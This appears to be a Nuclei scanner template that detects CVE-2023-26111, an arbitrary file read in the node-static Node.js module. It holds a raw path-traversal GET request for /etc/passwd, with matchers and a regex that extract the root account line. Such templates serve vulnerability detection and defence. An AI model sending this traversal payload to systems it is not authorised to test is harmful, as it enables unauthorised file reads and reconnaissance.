id: CVE-2023-26111

info:
  name: Node-static Arbitrary File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    node-static is a Node.js RFC 2616 compliant HTTP static file server processing module. An arbitrary file read vulnerability exists in node-static, allowing attackers to read critical system files like database or system configuration files, potentially placing the website in an insecure state.
  reference:
    - https://gist.github.com/lirantal/c80b28e7bee148dc287339cb483e42bc
  tags: file-read

http:
  - raw:
      - |
        GET /../../../../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:x:"
          - "/bin/"

    extractors:
      - type: regex
        part: body
        regex:
          - "root:x:[0-9]+:[0-9]+:.*:/bin/bash"
